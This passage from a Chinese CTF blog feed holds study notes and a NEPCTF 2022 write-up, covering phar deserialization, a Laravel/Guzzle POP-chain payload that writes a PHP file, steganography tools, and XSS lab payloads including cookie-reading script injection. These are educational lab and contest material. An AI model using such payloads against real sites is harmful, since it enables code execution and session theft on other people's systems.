class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>生成的phar文件修改为jpg格式文件上传（phar文件的后缀可以任意修改，不影响解析利用）</p><p>Payload：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">file</span>=phar://upload/<span class="hljs-keyword">test</span>.jpg<br></code></pre></td></tr></table></figure><h2 id="暴力破解漏洞"><a href="#暴力破解漏洞" class="headerlink" title="暴力破解漏洞"></a>暴力破解漏洞</h2>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>Web漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-NEPCTF-WriteUp</title>
    <link href="/2022/07/20/2022-NEPCTF-WRITEUP/"/>
    <url>/2022/07/20/2022-NEPCTF-WRITEUP/</url>
    
    <content type="html"><![CDATA[<h2 id="比赛信息"><a href="#比赛信息" class="headerlink" title="比赛信息"></a>比赛信息</h2><hr><p><strong>比赛昵称：</strong>ZERO </p><p><strong>比赛积分：</strong>1218</p><p><strong>比赛排名：</strong>60</p><hr><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="1-快来签到"><a href="#1-快来签到" class="headerlink" title="1.快来签到"></a>1.<strong>快来签到</strong></h3><p>修改IDA的配置文件，将hexrays.cfg里的MAX_FUNCSIZE数值调大，之后将文件拖入，再在options中的Graph里将Max number of nodes的数值改大，这时能在左下角看到Flag。</p><p><strong>Flag：NepCTF{welc0me_t0_nepctf}</strong></p><h3 id="2-JustKidding"><a href="#2-JustKidding" class="headerlink" title="2.JustKidding"></a>2.<strong>JustKidding</strong></h3><p>通过扫描网站，发现<a href="http://www.zip/">www.zip</a>存在源码泄露，下载后对源码进行审计，发现存在反序列化漏洞。</p><p>通过直播时给出的hint，搜寻近期的<a href="https://xz.aliyun.com/t/11362">laravel反序列化漏洞</a>，构造pop链：TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6NDoiZGF0YSI7YToyOntzOjc6IkV4cGlyZXMiO3M6MTg6Ijw&#x2F;cGhwIHBocGluZm8oKTs&#x2F;PiI7czo3OiJEaXNjYXJkIjtpOjA7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO3M6NDE6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAGZpbGVuYW1lIjtzOjEwOiIuL2luZm8ucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fQ&#x3D;&#x3D;</p><p>Payload如下：<a href="http://c66d6253-9a3b-4119-afd3-ac2e42a74137.nep.lemonprefect.cn:81/hello?h3=TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6NDoiZGF0YSI7YToyOntzOjc6IkV4cGlyZXMiO3M6MTg6Ijw/cGhwIHBocGluZm8oKTs/PiI7czo3OiJEaXNjYXJkIjtpOjA7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO3M6NDE6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAGZpbGVuYW1lIjtzOjEwOiIuL2luZm8ucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fQ==">http://c66d6253-9a3b-4119-afd3-ac2e42a74137.nep.lemonprefect.cn:81/hello?h3=TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6NDoiZGF0YSI7YToyOntzOjc6IkV4cGlyZXMiO3M6MTg6Ijw/cGhwIHBocGluZm8oKTs/PiI7czo3OiJEaXNjYXJkIjtpOjA7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO3M6NDE6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAGZpbGVuYW1lIjtzOjEwOiIuL2luZm8ucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fQ==</a></p><p>之后访问info.php，在Environment中得到了Flag。</p><p><strong>Flag：NepCTF{016aa038-cd18-496e-8648-0f71f3efad7f}</strong></p><h3 id="3-签到题"><a href="#3-签到题" class="headerlink" title="3.签到题"></a>3.<strong>签到题</strong></h3><p>下载附件后用010editor打开，发现下面藏在zip格式的压缩包，将其提取出，通过在网上搜索得到的一次性解压代码进行解压得到最后一个压缩包，将其拖入010editor发现是伪加密，修改后解压，得到一个流量文件，拖入wireshack根据文件名提示：keyboard，猜想是根据usb流量来判断键盘的输入内容，<a href="https://qwzf.github.io/2020/08/01/CTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B(%E4%BA%8C)-USB%E6%B5%81%E9%87%8F/%EF%BC%89">参考链接</a>。于是通过tshark提取出流量，再通过网上搜索的脚本进行信息还原，最终得到Flag。</p><p><strong>Flag：nepctf{welcome_to_nepctf_2nd}</strong></p><h3 id="4-花花画画画花花"><a href="#4-花花画画画花花" class="headerlink" title="4.花花画画画花花"></a>4.<strong>花花画画画花花</strong></h3><p>下载附件得到osz的文件，网上搜索后得知这是osu这款音游的谱子，下载osu并将附件导入，在Edit模式中逐帧观察得到Flag。</p><p><strong>Flag：NepCTF{MASTER_OF_坏女人！}</strong></p><h3 id="5-馅饼？陷阱"><a href="#5-馅饼？陷阱" class="headerlink" title="5.馅饼？陷阱!"></a>5.<strong>馅饼？陷阱!</strong></h3><p>通过观察附件中的图片，可以在图片中得到关键信息：“琼”、“大禾寿司”、“如家宾馆”、“东北饺子城”。通过车牌上面的“琼”来锁定拍摄地区为海南，继续搜索“大禾寿司”通过谷歌地图的实景观察以及剩余信息的排查比对得到最终照片拍摄地：“海南省三亚市天涯区新风街”，根据分析，该银行为“光大银行”，搜索其官网得到Flag。</p><p><strong>Flag：NepCTF{<a href="http://www.cebbank.com}/">www.cebbank.com}</a></strong></p><h2 id="未解出题目的思路和猜想"><a href="#未解出题目的思路和猜想" class="headerlink" title="未解出题目的思路和猜想"></a><strong>未解出题目的思路和猜想</strong></h2><h3 id="1-DCTris"><a href="#1-DCTris" class="headerlink" title="1.DCTris"></a>1.<strong>DCTris</strong></h3><p>通过附件搜索以及题目暗示可知是Dreamcast的游戏，但尝试使用多种Dreamcast模拟器（如：DEmul、Redream、NullDC……）后仍无法打开游戏或者是打开后卡在开始界面…最终只能放弃。</p><h3 id="2-DoubleHappiness"><a href="#2-DoubleHappiness" class="headerlink" title="2.DoubleHappiness"></a>2.<strong>DoubleHappiness</strong></h3><p>下载附件后，在010editor中查询到关于拍摄手机型号、拍摄时间等信息，通过查看图片属性得到具体经纬度以及大致地点等信息，通过浏览器进行关键词搜索，未发现相关有效信息…最终无奈放弃。</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>NEPCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈CTF-Misc</title>
    <link href="/2022/07/19/misc/"/>
    <url>/2022/07/19/misc/</url>
    
    <content type="html"><![CDATA[<h1 id="浅谈CTF-Misc"><a href="#浅谈CTF-Misc" class="headerlink" title="浅谈CTF-Misc"></a>浅谈CTF-Misc</h1><h2 id="什么是Misc"><a href="#什么是Misc" class="headerlink" title="什么是Misc"></a>什么是Misc</h2><p>Misc 是英文 Miscellaneous 的前四个字母，杂项、混合体、大杂烩的意思。</p><p>MISC，中文即杂项，<strong>包括隐写，数据还原，脑洞、社会工程、压缩包解密、流量分析取证、与信息安全相关的大数据等</strong>。</p><p>详细解释内容请见——&gt;<a href="https://ctf-wiki.org/misc/introduction/">传送门</a></p><p>关于Misc的入门教程在网上挺多的，这里不再做详细阐述。</p><p>这里主要对我个人学习过程中所遇到的相关经典胎教问题进行解释。</p><p><strong>参考内容：山石安研院第二节CTF夏令营Misc教学内容</strong>、sec_wuyy师傅的<a href="https://www.cnblogs.com/sec-wuyy/p/14593000.html">文章</a></p><h2 id="一、文件头残缺或错误"><a href="#一、文件头残缺或错误" class="headerlink" title="一、文件头残缺或错误"></a>一、文件头残缺或错误</h2><p>文件有后缀名，但是无法正常打开，或者没有后缀名，同时通过file命令（Linux）发现文件类型是data，表示很有可能是文件头残缺或错误导致的，这时候需要根据<strong>后缀名、题目提示、文件头尾部数据等</strong>去猜测文件的真实类型，并使用**<a href="http://www.x-ways.net/winhex/">winhex</a>、<a href="https://www.sweetscape.com/010editor/">010Editor</a>**等软件添加或修改相应的文件头。</p><h3 id="文件类型判断技巧："><a href="#文件类型判断技巧：" class="headerlink" title="文件类型判断技巧："></a>文件类型判断技巧：</h3><table><thead><tr><th>文件类型</th><th>特点</th></tr></thead><tbody><tr><td>ZIP</td><td>文件尾部包含0x504B0506的</td></tr><tr><td>RAR</td><td>文件结尾为0xC43D7B004007</td></tr><tr><td>JPG</td><td>文件结尾为0xFFD9</td></tr><tr><td>PNG</td><td>文件头中包含<a href="https://blog.csdn.net/ismismist/article/details/123535578">IHDR信息</a></td></tr><tr><td>GIF</td><td>文件结尾为0x3B</td></tr></tbody></table><h2 id="二、文件分离"><a href="#二、文件分离" class="headerlink" title="二、文件分离"></a>二、文件分离</h2><p><strong>binwalk</strong></p><p>binwalk可以快速分辨文件是否由多个文件合并而成，并将文件进行分离，分离成功会在目标文件的目录下生成一个形如**_文件名_extracted**的文件目录，目录中有分离后的文件。</p><p>binwalk在kali里是自带的，想在window使用可以参考此教程<a href="https://blog.csdn.net/Goodric/article/details/117845492">传送门</a></p><h3 id="简单操作教程"><a href="#简单操作教程" class="headerlink" title="简单操作教程"></a>简单操作教程</h3><p><strong>文件分析：</strong>binwalk 文件名</p><p><strong>文件分离：</strong>binwalk -e 文件名</p><p>详细操作教程<a href="https://blog.csdn.net/qq_50854790/article/details/123391951?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-123391951-blog-123426905.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-123391951-blog-123426905.pc_relevant_aa&utm_relevant_index=1">传送门</a></p><p><strong>foremost</strong></p><p>如果binwalk无法正确分离出文件，可用使用foremost。</p><p>foremost在kali已预装载</p><p><strong>文件分离：</strong>foremost 文件名 -o 输出文件名</p><h2 id="三、盲水印"><a href="#三、盲水印" class="headerlink" title="三、盲水印"></a>三、盲水印</h2><p>盲水印是利用二维傅里叶变换，给文件添加肉眼无法直接看到的水印数据。</p><p>盲水印不仅仅用于图片，也可应用于像音频这种数据流</p><p><strong>当出现两张看起来一模一样的图片，可以用盲水印解密工具来尝试。</strong></p><h3 id="BlindWaterMark工具"><a href="#BlindWaterMark工具" class="headerlink" title="BlindWaterMark工具"></a>BlindWaterMark工具</h3><p>工具下载<a href="https://github.com/chishaxie/BlindWaterMark">传送门</a></p><p><strong>合成盲水印：</strong>python3 bwmforpy3.py encode 原图 信息文件 盲水印图片</p><p><strong>提取盲水印：</strong>python3 bwmforpy3.py decode 原图 盲水印图片 信息文件</p><p>详细操作教程<a href="https://hetian.blog.csdn.net/article/details/122572238?spm=1001.2101.3001.6650.15&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-15-122572238-blog-82847756.pc_relevant_multi_platform_whitelistv1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-15-122572238-blog-82847756.pc_relevant_multi_platform_whitelistv1&utm_relevant_index=18">传送门</a></p><h2 id="四、音频隐写"><a href="#四、音频隐写" class="headerlink" title="四、音频隐写"></a>四、音频隐写</h2><p>详细可以参考此文章<a href="https://blog.csdn.net/qq_51652400/article/details/123504708">传送门</a></p><h3 id="推荐工具"><a href="#推荐工具" class="headerlink" title="推荐工具"></a>推荐工具</h3><p><strong>MP3stego</strong></p><p>工具下载<a href="https://www.petitcolas.net/steganography/mp3stego">传送门</a></p><p><strong>加密：</strong> encode -E 加密的txt文件名 -P pass 加密的wav文件名 输出的mp3文件名</p><p><strong>解密：</strong>decode -X -P pass MP3文件名</p><h2 id="五、伪加密"><a href="#五、伪加密" class="headerlink" title="五、伪加密"></a>五、伪加密</h2><p>一个ZIP文件由三部分组成：</p><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标准</p><ul><li><p><strong>无加密</strong>：压缩源文件数据区的全局加密应当为00 00，且压缩源文件目录区的全局方式位标记应当为00 00</p></li><li><p><strong>真加密：</strong>压缩源文件数据区的全局加密应当为09（或奇数） 00，且压缩源文件目录区的全局方式位标记应当为09（或奇数） 00</p></li><li><p><strong>伪加密：</strong>压缩源文件数据区的全局加密应当为00（或其他数） 00，且压缩源文件目录区的全局方式位标记应当为09（或奇数） 00</p></li></ul><h2 id="六、图片隐写"><a href="#六、图片隐写" class="headerlink" title="六、图片隐写"></a>六、图片隐写</h2><h3 id="常见的图片隐写方式："><a href="#常见的图片隐写方式：" class="headerlink" title="常见的图片隐写方式："></a>常见的图片隐写方式：</h3><p>摘自：<a href="https://zhuanlan.zhihu.com/p/467859047">传送门</a></p><p>1.修改数据（png图片用winhex或者是010工具打开后，可以看到第二行前四个数据是高，后四个数据是宽。一般需要修改这两组数据来获得完整的图片）</p><p>2.图片的属性，详细信息中含有flag或者是含有密码，可以通过解密工具进行解密。</p><p>3.图片中含有另一张图，这时最简单的方法是使用<a href="https://github.com/korczis/foremost">foremost</a>工具进行图片的分离</p><p>4.通过查看一个文件的文件头含有：<strong>data:image&#x2F;png;base64，这就属于png图片格式，</strong>真正的base64编码是前缀之后的那些数据，然后就可以利用base64转图片进行操作（base64比较常用，但还是具体问题具体分析）</p><p>5.修改文件的后缀名：如将txt文件修改为jpg文件或者是png文件；有些题目需要将所有的文件名修改为png或jpg文件名后缀，然后拼接成为一个完整的flag</p><p>……</p><h3 id="推荐工具："><a href="#推荐工具：" class="headerlink" title="推荐工具："></a>推荐工具：</h3><p><strong>OutGuess</strong></p><p>下载（kali）教程<a href="https://blog.csdn.net/m0_58199719/article/details/123692511">传送门</a></p><p><strong>隐藏文件：</strong>outguess -k 秘钥 -d 隐藏文件 原始图片 加密后的图片</p><p><strong>提取文件：</strong>outguess -k 秘钥 -r 加密后的图片 输出文件名</p><h2 id="七、流量分析"><a href="#七、流量分析" class="headerlink" title="七、流量分析"></a>七、流量分析</h2><h3 id="IP筛选"><a href="#IP筛选" class="headerlink" title="IP筛选"></a>IP筛选</h3><table><thead><tr><th>ip.src &#x3D;&#x3D; 地址</th><th>源ip筛选</th></tr></thead><tbody><tr><td>ip.dst &#x3D;&#x3D; 地址</td><td>目的ip筛选</td></tr><tr><td>ip.addr &#x3D;&#x3D; 地址</td><td>ip筛选</td></tr></tbody></table><h3 id="MAC地址筛选"><a href="#MAC地址筛选" class="headerlink" title="MAC地址筛选"></a>MAC地址筛选</h3><table><thead><tr><th>eth.dst &#x3D;&#x3D; A0:00:00:04:C5:84</th><th>目标mac地址筛选</th></tr></thead><tbody><tr><td>eth.addr</td><td>mac地址筛选</td></tr></tbody></table><h3 id="端口筛选"><a href="#端口筛选" class="headerlink" title="端口筛选"></a>端口筛选</h3><table><thead><tr><th>tcp.dstport &#x3D;&#x3D; 80</th><th>筛选tcp协议的目标端口为80的流量包</th></tr></thead><tbody><tr><td>tcp.srcport &#x3D;&#x3D; 80</td><td>筛选tcp协议的源端口为80的流量包</td></tr><tr><td>udp.srcport &#x3D;&#x3D; 80</td><td>筛选udp协议的源端口为80的流量包</td></tr></tbody></table><h3 id="协议筛选"><a href="#协议筛选" class="headerlink" title="协议筛选"></a>协议筛选</h3><table><thead><tr><th>tcp</th><th>筛选协议为tcp的流量包</th></tr></thead><tbody><tr><td>udp</td><td>筛选协议为udp的流量包</td></tr><tr><td>arp&#x2F;icmp&#x2F;http&#x2F;ftp&#x2F;dns&#x2F;ip</td><td>筛选协议为arp&#x2F;icmp&#x2F;http&#x2F;ftp&#x2F;dns&#x2F;ip的流量包</td></tr></tbody></table><p><strong>注：可用！加协议名或者not加协议名表示排除该协议</strong></p><h3 id="流量包的修复"><a href="#流量包的修复" class="headerlink" title="流量包的修复"></a>流量包的修复</h3><p>通过在线pacp包修复工具进行修复 <a href="http://f00l.de/hacking/pcapfix.php">传送门</a></p><p><strong>才疏学浅、粗略总结，如有不足和错误，还望各位大师傅们帮忙指正:)！！！</strong></p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS漏洞学习笔记</title>
    <link href="/2022/06/27/xss/"/>
    <url>/2022/06/27/xss/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS靶场练题记录"><a href="#XSS靶场练题记录" class="headerlink" title="XSS靶场练题记录"></a>XSS靶场练题记录</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a><strong>XSS简介</strong></h2><p>XSS全称（Cross Site Scripting）跨站脚本攻击，为了避免和CSS（Cascading Style Sheet）层叠样式表名称冲突，所以改为了XSS，是最常见的Web应用程序安全漏洞之一，在2013年和2017年的OWASP Top 10分别位于第三名和第七名。</p><p>跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页(input表单、URL、留言版等位置)，其他用户在浏览网页时会受到影响，恶意用户利用xss代码攻击成功后，当用户或管理员浏览该页面时，嵌入 Web 里面的 Script 代码会被执行，从而达到恶意攻击的目的。</p><p>XSS漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong></p><h2 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h2><p>服务器对用户提交的数据过滤不严，导致浏览器把用户的输入当成了JS代码并直接返回给客户端执行，从而实现<strong>对客户端的攻击</strong>目的</p><p>XSS属于客户端攻击，受害者最终是用户，但网站的相关管理人员也属于用户之一，这就意味着XSS也可能攻击到“服务端”，因为管理员的账号权限比普通用户的账号权限要大的多，一般管理员都可以对网站进行文件管理、数据管理等操作，而攻击者一般也是考管理员的身份作为“跳板”而进行实施攻击</p><p>XSS攻击最终目的是在网页中嵌入客户端恶意脚本代码，最常用的攻击代码语言是Javascript语言，但也可能会使用其他语言，例如：ActionScript、VBScript。但如今互联网客户端基本都是基于Javascript</p><h2 id="XSS漏洞的危害"><a href="#XSS漏洞的危害" class="headerlink" title="XSS漏洞的危害"></a>XSS漏洞的危害</h2><p>1.网络钓鱼，包括盗取各类用户账号 <a href="https://cloud.tencent.com/developer/article/1517803">https://cloud.tencent.com/developer/article/1517803</a></p><p>2.窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作</p><p>3.劫持用户(浏览器)会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等</p><p>4.特定条件下，可以网页挂马，进行恶意操作 <a href="https://blog.csdn.net/Monsterlz123/article/details/91127385">https://blog.csdn.net/Monsterlz123/article/details/91127385</a></p><p>5.进行大量的客户端攻击，如DDoS攻击 <a href="https://blog.csdn.net/wsnbbz/article/details/104652337">https://blog.csdn.net/wsnbbz/article/details/104652337</a></p><h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><p>XSS漏洞大概可以分为三个类型：反射型XSS、存储型XSS和DOM型XSS</p><h3 id="反射型-非持久化"><a href="#反射型-非持久化" class="headerlink" title="反射型(非持久化)"></a>反射型(非持久化)</h3><p>反射型XSS又称为非持久型XSS，这种攻击方式往往具有一次性。攻击者通过电子邮件或者聊天工具等将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器就收目标的请求并进行处理，然后把带有XSS代码的数据发送给目标用户的浏览器，浏览器会解析这段带有XSS代码的恶意脚本，就会触发XSS漏洞。</p><p><strong>注意！！！这里以pikachu漏洞练习平台为例</strong></p><p><strong>反射性XSS（get）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Python">Payload：<br>&lt;script&gt;alert(<span class="hljs-string">&#x27;xss&#x27;</span>)&lt;/script&gt;<br>注意：要注意alert()括号里面的写法，如字母xss，要加引号或/或反引号，数字不用<br><br>刚把payload放进输入框，还没submit就发现payload被截短了，应该是html代码中的限制<br>由于此处为get传参，所以有两个方法来进行绕过<br><br><span class="hljs-number">1.</span>直接在地址栏插入Payload<br><span class="hljs-number">2.</span>使用开发者工具，修改html代码中的长度限制<br><br>执行流程：<br>在输入点输入内容，构造恶意代码，输入点是以 GET 方式提交的<br>后端接受提交的数据，并没有对输入进行过滤<br>然后将其呈现给前端，浏览器执行恶意代码<br></code></pre></td></tr></table></figure><p><strong>反射性XSS（post）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">Payload：<br>&lt;script&gt;alert(<span class="hljs-string">&#x27;xss&#x27;</span>)&lt;/script&gt;<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="存储型XSS（持久化）"><a href="#存储型XSS（持久化）" class="headerlink" title="存储型XSS（持久化）"></a><strong>存储型XSS（持久化）</strong></h3><p>存储型XSS又称为持久性XSS，攻击脚本将被永久的存放在目标服务器的数据库或文件中，既有很高的隐蔽性。这种攻击手法多见于论坛、博客和留言板；攻击者在发帖的过程中，将恶意脚本和正常的信息一起注入帖子的内容中。帖子被服务器存储下来，恶意脚本也就会被存放在服务器的后端数据库中，当其他的用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中解析并执行。</p><p><strong>注意！！！这里以pikachu漏洞练习平台为例</strong></p><p><strong>存储型XSS</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">Payload：<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br><br>执行流程：<br>在留言板处输入内容，构造恶意代码<br>将输入的内容提交给后端代码执行，后端对输入过滤不严谨，然后执行插入的数据操作<br>此时，我们的恶意代码已经保存在数据库。不管何时何地何人查看这条留言，都会执行恶意代码，除非数据库中删除这条恶意代码(后面不管输入什么，结果都是一样的<br></code></pre></td></tr></table></figure><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p><strong>DOM简介</strong></p><p>DOM全称Document Object Model，简单来说DOM文档就是一份XML文档，当有了DOM标准之后，DOM便将前端html代码化为一个树状结构，方便程序和脚本能够轻松的动态访问和更新这个树状结构的内容、结构以及样式，且不需要经过服务端</p><p><strong>DOM型XSS漏洞简介</strong></p><p>DOM型XSS执行场景跟之前两个不同，他是基于文档对象模型的漏洞，它可以动态的构造DOM节点。所以说，该漏洞是不经过后端代码的，直接构造恶意代码，即可在前端展示。用户请求一个专门设计的URL，它是由攻击者提交，而且其中包含XSS代码。服务器不会以任何的形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM型对象就会处理XSS代码</p><p>所以说DOM型XSS可以在前端通过js渲染来完成数据的交互，达到插入数据造成XSS脚本攻击，且不经过服务器，所以即使抓包无无法抓取到这里的流量，而反射性与存储型xss需要与服务器交互，这便是三者的区别</p><p><strong>注意！！！这里以pikachu漏洞练习平台为例</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">Payload：<br><span class="hljs-string">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;</span>xss<span class="hljs-string">&#x27;)&quot;&gt;</span><br><span class="hljs-string">&#x27;</span>onclick=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;<br><br>onmouseover需要鼠标划过，onclick需要鼠标点击<br></code></pre></td></tr></table></figure><h2 id="XSS-labs靶场部分题目练习"><a href="#XSS-labs靶场部分题目练习" class="headerlink" title="XSS-labs靶场部分题目练习"></a>XSS-labs靶场部分题目练习</h2><h3 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h3><p>查看网站源码，可以发现<strong>get传参name的值test插入了html里</strong>，还回显了payload的长度</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs PHP">Payload：<br>&lt;script&gt;<span class="hljs-title function_ invoke__">alert</span>()&lt;/script&gt;<br>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level2.php?keyword=test&quot;</span>;   <span class="hljs-comment">//重定义alert函数，当调用alert时，会弹出confirm对话框并重定向到level2.php</span><br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level1&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP">尝试输入Payload：<br>&lt;script&gt;<span class="hljs-title function_ invoke__">alert</span>()&lt;/script&gt;<br><br>没有成功，通过view-source查看源码<br>很明显，第一个test进行了html实体转义，但是第二个没有，我们只需要闭合掉双引号即可，构造payload<br><br>Payload：<br><span class="hljs-string">&quot;&gt;  &lt;script&gt;alert()&lt;/script&gt;  &lt;&quot;</span><br></code></pre></td></tr></table></figure><p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 